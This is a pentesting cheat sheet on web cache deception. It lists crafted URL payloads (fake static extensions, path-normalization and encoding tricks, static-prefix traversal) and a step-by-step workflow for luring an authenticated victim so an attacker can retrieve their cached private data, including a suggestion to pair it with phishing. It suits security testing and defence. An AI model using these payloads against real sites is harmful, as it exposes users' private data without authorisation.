---
aliases:
  - Web Cache Deception
  - WCD
  - Path Confusion Cache
tags:
  - type/cheatsheet
  - vuln/cache-poisoning
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Web Cache Poisoning]]'
---
# Web Cache Poisoning - Cache Deception

***

## Path Confusion (.css / .js Extension Trick)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Cache configurado para cachear automáticamente paths con extensiones estáticas (`.css`, `.js`, `.png`). Atacante construye URL con extensión que termina en endpoint dinámico privado. | Vector clásico — Omer Gil 2017. |
| URL trick básico | `https://target/account.css` → backend ignora `.css` y sirve `/account` (con data sensible) | Cache guarda response como `.css`. |
| Variant `.js` | `https://target/profile.js` | Same idea. |
| Variant `.png` / `.jpg` | `https://target/admin.png` | Image cache aggressive. |
| Variant `.gif` | `https://target/api/users.gif` | Long TTL. |
| Variant `.ico` | `https://target/internal.ico` | Favicon path. |
| Variant `.svg` / `.webp` / `.woff` | Modern static formats | Same idea. |
| Path con segmento adicional | `https://target/account/styles.css` | Backend usa solo `/account`. |
| Path nesting | `https://target/me/avatar.css` | Igual concepto. |
| Workflow attacker | 1. Trick victim a visit URL maligno 2. Victim authenticated visita 3. Cache stores response sensible 4. Atacante refetcha URL → recibe data victim | Multi-step. |
| Combine con phishing | Mandar link con extensión → user click → cache pollute con su data | Stealth. |
| Common misconfigured CDNs | Cloudflare con "Cache Everything", Akamai default rules | Frequent. |
^wcp-deception-extension

### PoC Cache Deception Workflow

```
1. Atacante envía link a victim:
   https://target.com/account/profile.css

2. Victim (autenticado) hace click → backend ignora .css, sirve /account/profile
   con data privada de victim.

3. Cache (configurado para cachear .css) stores la response.

4. Atacante (NO autenticado) request mismo URL:
   https://target.com/account/profile.css
   → Cache HIT → recibe data privada de victim
```

___

## Path Normalization Differences

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Doble slash | `https://target//api/me` | Backend normaliza `//` a `/` → mismo endpoint, cache trata distinto. |
| Slash + dot | `https://target/api/me/.` | Backend ignora `/.` → mismo endpoint. |
| Encoded dot | `https://target/api/me/%2e` | URL-encoded `.`. |
| Encoded slash | `https://target/api%2Fme` | URL-encoded `/`. |
| Path traversal `/foo/../api/me` | Cache no normaliza, backend resolve | Differential. |
| Trailing space encoded | `https://target/api/me%20` | Backend trim, cache no. |
| Trailing CR/LF | `https://target/api/me%0a` | Edge. |
| Case insensitivity | `https://target/API/me` | Backend lowercases, cache no. |
| Doble dot | `https://target/api/me/..` | Backend resolve, cache no. |
| Combined extension + traversal | `/api/me/../static/x.css` | Multi-trick. |
| Method override | POST `_method=GET` para cachear como GET | Combo HRS. |
| Encoded query | `?a=1%26b=2` (encoded `&`) | Differential parse. |
^wcp-deception-normalization

___

## Static Prefix Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Prefix `/static/` mapeo | `https://target/static/../api/me` | Cache sees `/static/...`, backend resolve traversal. |
| Prefix `/assets/` | `https://target/assets/../admin` | Igual idea. |
| Prefix `/images/` | `https://target/images/../private` | Heavy cache TTL. |
| Prefix `/cdn/` | Custom CDN path | App-specific. |
| Combine con encoded slash | `/static/%2e%2e/admin` | Bypass de filter. |
| Subdomain + prefix | `static.target.com/../app/admin` | Cross-subdomain quirk. |
| Force longer cache TTL | Static paths típicamente cached 1 año | Persistencia. |
| Static prefix con query string | `/static/file.css?path=../admin` | Custom routers. |
| Shadow paths | `/admin/static/me.css` (admin path con extensión) | Permission inversion. |
| Combine con SPA routing | Frontend SPA + backend API com URLs solapados | Confusion. |
^wcp-deception-prefix

___

## Encoded Slashes y Variantes

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| URL-encoded slash | `%2F` | Some caches treat as `/`, others not. |
| Doble encoded | `%252F` | Decoded `%2F` = `/`. |
| Backslash | `\` | Windows backslash → forward slash en algunos backends. |
| URL-encoded backslash | `%5C` | Same. |
| Unicode slash | `/` | JS contexts. |
| Fullwidth slash | `／` (U+FF0F) | Some normalizers. |
| Encoded null | `%00` | Path truncation. |
| Encoded CRLF | `%0D%0A` | Header/path injection. |
| Encoded space | `%20` | Trailing trim. |
| Encoded tab | `%09` | Same. |
| Encoded vertical tab | `%0B` | Edge. |
| Triple-encoded | `%25252F` | Multi-decode chains. |
| Mixed case encoding | `%2f` vs `%2F` | Case-sensitive cache key. |
^wcp-deception-encoded

### Resumen Cache Deception vs Cache Poisoning

| | **Cache Poisoning** | **Cache Deception** |
|---|---|---|
| Atacante controla | Headers/inputs unkeyed | Path con extensión/normalización |
| Cache stores | Response controlada por atacante | Response privada de víctima |
| Víctima | Recibe contenido del atacante | Genera contenido cacheado |
| Atacante | Ataca con headers malignos | Trick victim a visit URL → atacante refetch |
| Fix | Include unkeyed inputs en key | Validate path normalization match cache config |

***
